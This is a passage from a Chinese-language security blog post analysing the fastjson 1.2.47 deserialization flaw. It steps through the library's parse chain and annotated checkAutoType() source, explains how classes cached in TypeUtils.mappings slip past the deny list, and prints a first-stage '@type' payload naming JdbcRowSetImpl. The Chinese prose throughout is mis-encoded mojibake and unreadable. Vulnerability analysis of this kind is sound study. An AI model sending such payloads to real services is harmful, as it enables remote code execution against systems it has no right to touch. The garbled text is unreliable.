RCEã€è¿™äº›æ¼æ´æˆ–ç‰¹æ€§æ˜¯å¦‚ä½•äº§ç”Ÿå¦‚ä½•åˆ©ç”¨çš„ï¼Œè¯¥å¦‚ä½•å¯»æ‰¾è¿™äº›å¯åˆ©ç”¨çš„æ¼æ´æˆ–ç‰¹æ€§æˆ–ç±»ï¼ˆæ„Ÿè§‰æˆ‘å®Œå…¨ä¸å…·å¤‡è¿™ä¸ªèƒ½åŠ›ï¼Œé˜¿å·´é˜¿å·´.jpgï¼Œæ—¥åç»§ç»­åŠªåŠ›ï¼‰ã€‚</p><p>é‚£ä¹ˆ fastjson æ¼æ´æ˜¯æ€ä¹ˆäº§ç”Ÿçš„å‘¢ï¼Œä¸»è¦æ˜¯ @type å±æ€§å¯ä»¥åœ¨ JSON å­—ç¬¦ä¸²ä¸­æŒ‡å®šååºåˆ—åŒ–æ—¶åº”è¯¥å®ä¾‹åŒ–çš„å…·ä½“ç±»ï¼Œè€Œç›¸åº”çš„å®‰å…¨æ£€æµ‹ã€è¡¥ä¸ï¼ˆ<code>checkAutoType()</code>ï¼‰å­˜åœ¨ç¼ºé™·ï¼Œè‡´ä½¿æ”»å‡»è€…å¯ä»¥æŒ‡å®šä¸€äº›å¯æ‰§è¡Œå‘½ä»¤æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„å±é™©ç±»ååºåˆ—åŒ–ã€‚</p><h2 id="fastjson-çš„-checkAutoType-æºç åˆ†æ"><a href="#fastjson-çš„-checkAutoType-æºç åˆ†æ" class="headerlink" title="fastjson çš„ checkAutoType()æºç åˆ†æ"></a>fastjson çš„ checkAutoType()æºç åˆ†æ</h2><p>ç®€å•å†™ä¸€ä¸ªæœåŠ¡ï¼Œå¯¼å…¥ fastjson1.2.47 åŒ…ï¼Œä½¿ç”¨ fastjson çš„æ–¹æ³•è¿›è¡Œè°ƒè¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br> <br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">mainController</span> &#123;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">parseJson</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String json)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON._parseObject_(json);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Parsed: &quot;</span> + obj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘åŒ… json å‚æ•°è®©ç›®æ ‡ååºåˆ—åŒ–å¤„ç†</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;<br></code></pre></td></tr></table></figure>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-48e63e18" role="button" aria-expanded="false" aria-controls="collapse-48e63e18">        <div class="fold-arrow">â–¶</div>æ­¤éƒ¨åˆ†å¯ç•¥è¿‡ï¼Œä½¿ç”¨ctrl+Nç›´æ¥æŸ¥æ‰¾checkAutoType()      </div>      <div class="fold-collapse collapse" id="collapse-48e63e18">        <div class="fold-content">          <p>ä½¿ç”¨ fastjson çš„ <code>parseobject()</code> ååœ¨ JSON.class è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">parseObject</span><span class="hljs-params">(String text)</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> _parse_(text);        <span class="hljs-comment">//æ­¥å…¥è¯¥å¥parse</span><br>    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>        <span class="hljs-keyword">return</span> (JSONObject)obj;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> (JSONObject)_toJSON_(obj);<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException var3) &#123;<br>            <span class="hljs-type">RuntimeException</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var3;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;can not cast to JSONObject.&quot;</span>, e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¥å…¥ <code>parse(text)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text)</span> &#123;<br>    <span class="hljs-keyword">return</span> _parse_(text, _DEFAULT_PARSER_FEATURE_);  <span class="hljs-comment">//æ­¥å…¥è¯¥å¥parse</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç»§ç»­æ­¥å…¥ <code>parse(text,  _DEFAULT_PARSER_FEATURE_ )</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, <span class="hljs-type">int</span> features)</span> &#123;<br>    <span class="hljs-keyword">return</span> _parse_(text, ParserConfig._getGlobalInstance_(), features);    <span class="hljs-comment">//æ­¥å…¥è¯¥å¥parse</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç»§ç»­æ­¥å…¥ï¼Œé€‰ä¸­ <code>parse</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, ParserConfig config, <span class="hljs-type">int</span> features)</span> &#123;<br>    <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();    <span class="hljs-comment">//æ­¥å…¥è¯¥å¥parse</span><br>        parser.handleResovleTask(value);<br>        parser.close();<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ä¾‹åŒ– <code>DefaultJSONParser</code> å¯¹è±¡åç»§ç»­æ­¥å…¥ <code>parse()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.parse((Object)<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»§ç»­æ­¥å…¥</p><p><img src="/img/fastjsonAndJNDI/PYPQbdNuCoA8M8xrc12csAtbnlC.png"></p><p>ç»§ç»­æ­¥å…¥</p><p><img src="/img/fastjsonAndJNDI/QkLobDJaioKbBvxIAgEc6ZYNn8R.png"></p><p>ç»§ç»­æ­¥å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.parse((Object)<span class="hljs-literal">null</span>);    <span class="hljs-comment">//æ­¥å…¥è¯¥å¥parse</span><br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div><p>æ€»ä¹‹ç›¯å‡† parse ä¸€å±‚å±‚è¿›å…¥å³å¯çœ‹åˆ° fastjson ååºåˆ—åŒ–çš„å¤§è‡´æµç¨‹ï¼Œéšåå°±å¯ä»¥å‘ç°å¯¹ <code>@type</code> çš„æ£€æµ‹å¤„ç†ï¼Œä½¿ç”¨ <code>checkAutoType()</code> å¯¹ <code>@type</code> åé¢çš„ç”¨æˆ·æŒ‡å®šç±»æ£€æŸ¥è¿‡æ»¤ï¼ŒåŠ è½½è¿”å›ä¸€ä¸ªè¯¥ç±»çš„å¯¹è±¡</p><p><img src="/img/fastjsonAndJNDI/LoDZblh8HoZ6I9xWOgycFOGlnzf.png"></p><p>æ­¥å…¥è§‚å¯Ÿæºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;    <span class="hljs-comment">//åˆ¤æ–­ç±»åéç©º</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &lt; <span class="hljs-number">128</span> &amp;&amp; typeName.length() &gt;= <span class="hljs-number">3</span>) &#123;  <span class="hljs-comment">//åˆ¤æ–­ç±»åé•¿åº¦ï¼Œå¦åˆ™æŠ›å‡ºå¼‚å¸¸</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">//è¯¥éƒ¨åˆ†ä½¿ç”¨äº†hashç®—æ³•åˆæ­¥å¤„ç†ï¼Œä¸ºäº†åç»­è·Ÿhashå¤„ç†è¿‡çš„é»‘ç™½åå•åŒ¹é…</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">BASIC</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3750763034362895579L</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">PRIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099511628211L</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> (-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span>;<br>        <span class="hljs-keyword">if</span> (h1 == -<span class="hljs-number">5808493101479473382L</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName); <span class="hljs-comment">//ç±»åä»¥ [ å¼€å¤´æŠ›å‡ºå¼‚å¸¸</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((h1 ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName); <span class="hljs-comment">//ç±»åä»¥ L å¼€å¤´ ; ç»“å°¾æŠ›å‡ºå¼‚å¸¸</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">2</span>)) * <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-type">long</span> hash;<br>            <span class="hljs-type">int</span> i;<br>            <span class="hljs-comment">//å½“autoTypeSupportå¼€å¯æˆ–æœŸæœ›çš„ç±»ä¸ä¸ºç©ºæ—¶ï¼ˆä¸Šä¸€æ­¥çš„å›¾ç‰‡ä¸­è°ƒç”¨checkAutoTypeæ—¶å¯ä»¥çœ‹åˆ°ä¼ å…¥çš„expectClassä¸ºnullï¼‰</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>                hash = h3;<br><br>                <span class="hljs-keyword">for</span>(i = <span class="hljs-number">3</span>; i &lt; className.length(); ++i) &#123;<br>                    hash ^= (<span class="hljs-type">long</span>)className.charAt(i);<br>                    hash *= <span class="hljs-number">1099511628211L</span>;<br>                    <span class="hljs-comment">//å…ˆæ£€æŸ¥hashå€¼æ˜¯å¦åœ¨ç™½åå•ä¸­å­˜åœ¨ï¼Œå­˜åœ¨åˆ™_loadClass_åŠ è½½ç±»å¹¶è¿”å›å¯¹è±¡</span><br>                    <span class="hljs-keyword">if</span> (Arrays._binarySearch_(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                        clazz = TypeUtils._loadClass_(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">false</span>);<br>                        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-comment">//åæ£€æŸ¥hashå€¼æ˜¯å¦åœ¨é»‘åå•ä¸­å­˜åœ¨ï¼Œå­˜åœ¨åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸</span><br>                    <span class="hljs-keyword">if</span> (Arrays._binarySearch_(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils._getClassFromMapping_(typeName) == <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">//å¦‚æœç»è¿‡ä¸Šé¢é»‘ç™½åå•æ£€æŸ¥åæˆ–autoTypeSupportæœªå¼€å¯ç­‰åŸå› å¯¼è‡´æœªæ£€æŸ¥åclazzä»ä¸ºnull</span><br>            <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                clazz = TypeUtils._getClassFromMapping_(typeName);<span class="hljs-comment">//é‚£ä¹ˆåœ¨TypeUtils.mappingsä¸­ç¼“å­˜çš„ç±»å¯»æ‰¾ç›®æ ‡</span><br>            &#125;<br><br>            <span class="hljs-comment">//å¦‚æœä¸Šè¿°é»‘ç™½åå•æ£€æŸ¥ååŠTypeUtils.mappingsç¼“å­˜ç±»æŸ¥æ‰¾åä»æœªæ‰¾åˆ°è¯¥ç±»ï¼ˆclazzä¸ºnullï¼‰</span><br>            <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<span class="hljs-comment">//åˆ™åœ¨deserializersä¸­ç»§ç»­å¯»æ‰¾</span><br>            &#125;<br><br>            <span class="hljs-comment">//å¦‚æœä¸Šè¿°ä¸‰ä¸ªé€”å¾„æœ‰ä»»æ„ä¸€ä¸ªæ‰¾åˆ°äº†ï¼Œclazzä¸ä¸ºnull</span><br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> clazz;<span class="hljs-comment">//é‚£ä¹ˆç›´æ¥è¿”å›å¯¹è±¡</span><br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//ä¸Šè¿°ä¸‰ä¸ªé€”å¾„ä»æœªæ‰¾åˆ°</span><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<span class="hljs-comment">//ä¸”autoTypeSupportå…³é—­</span><br>                    hash = h3;<br><br>                    <span class="hljs-comment">//è·Ÿå‰é¢å·®ä¸å¤šçš„é»‘ç™½åå•æ£€æŸ¥ï¼Œä½†å…ˆé»‘åç™½</span><br>                    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">3</span>; i &lt; className.length(); ++i) &#123;<br>                        <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> className.charAt(i);<br>                        hash ^= (<span class="hljs-type">long</span>)c;<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays._binarySearch_(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (Arrays._binarySearch_(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                                clazz = TypeUtils._loadClass_(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">false</span>);<br>                            &#125;<br><br>                            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                            &#125;<br><br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//ä¸è®ºautoTypeSupportæ˜¯å¦å¼€å¯å‡é»‘ç™½åå•æ£€æŸ¥è¿‡åï¼Œä¸”TypeUtils.mappingsã€deserializerså¯»æ‰¾åå‡æœªæ‰¾åˆ°</span><br>                    clazz = TypeUtils._loadClass_(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">false</span>);<span class="hljs-comment">//åˆ™ä½¿ç”¨TypeUtils.loadClasså°è¯•åŠ è½½è¿™ä¸ªç±»</span><br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//ä¸Šé¢TypeUtils._loadClassæˆåŠŸåŠ è½½äº†è¯¥ç±»åˆ™å†åšä¸€äº›å®‰å…¨å¤„ç†_</span><br>                    <span class="hljs-keyword">if</span> (TypeUtils._getAnnotation_(clazz, JSONType.class) != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br><br>                    <span class="hljs-comment">//ç¦æ­¢ååºåˆ—åŒ–ClassLoaderå’ŒDataSourceï¼Œåšä¸€äº›å®‰å…¨æªæ–½</span><br>                    <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br><br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                    &#125;<br><br>                    <span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo._build_(clazz, clazz, <span class="hljs-built_in">this</span>.propertyNamingStrategy);<br>                    <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-type">int</span> <span class="hljs-variable">mask</span> <span class="hljs-operator">=</span> Feature._SupportAutoType_.mask;<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">autoTypeSupport</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeSupport || (features &amp; mask) != <span class="hljs-number">0</span> || (JSON._DEFAULT_PARSER_FEATURE _&amp; mask) != <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§è‡´åˆ†æä¸€ä¸‹ä¸»è¦é€»è¾‘ï¼šå½“ <code>autoTypeSupport</code> å…³é—­æ—¶ï¼Œç¬¬ä¸€æ¬¡é’ˆå¯¹ <code>autoTypeSupport</code> å¼€å¯æ—¶çš„é»‘ç™½åå•æ£€æŸ¥ä¸ä¼šè¿›è¡Œï¼Œå¦‚æœåœ¨ <code>TypeUtils.mappings</code>ã€<code>deserializers</code> ä¸­å¯ä»¥æ‰¾åˆ°ç›®æ ‡ç±»ï¼Œé‚£ä¹ˆç›´æ¥åŠ è½½è¯¥ç±»è¿”å›å¯¹è±¡ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œé‚£ä¹ˆè¿›è¡Œç¬¬äºŒæ¬¡çš„é’ˆå¯¹ <code>autoTypeSupport</code> å…³é—­æ—¶çš„é»‘ç™½åå•æ£€æŸ¥ï¼Œè¿˜æ‰¾ä¸åˆ°åˆ™å°è¯•ä½¿ç”¨ <code>TypeUtils.loadClass</code> åŠ è½½è¿™ä¸ªç±»å¹¶åšå®‰å…¨å¤„ç†ï¼›å½“ <code>autoTypeSupport</code> å¼€å¯æ—¶ï¼Œç¬¬ä¸€æ¬¡çš„é»‘ç™½åå•æ£€æŸ¥æ— æ³•ç»•è¿‡ï¼Œå¿…ç„¶ä¼šæ‰§è¡Œï¼Œåé¢å†åœ¨ <code>TypeUtils.mappings</code>ã€<code>deserializers</code> ä¸­æŸ¥æ‰¾ï¼Œæ‰¾ä¸åˆ°åˆ™å°è¯•ä½¿ç”¨ <code>TypeUtils.loadClass</code> åŠ è½½è¿™ä¸ªç±»å¹¶åšå®‰å…¨å¤„ç†ã€‚</p><p>é€šè¿‡ä»¥ä¸Šå¯¹ <code>checkAutoType()</code> åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ä¸ªé€»è¾‘ä¸Šçš„æ¼æ´ï¼šå½“ <code>autoTypeSupport</code> å…³é—­æ—¶ï¼Œåªè¦å¯ä»¥è®©ç›®æ ‡ç±»åœ¨ <code>TypeUtils.mappings</code>ã€<code>deserializers</code> ä¸­è¢«æ‰¾åˆ°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡åé¢é’ˆå¯¹ <code>autoTypeSupport</code> 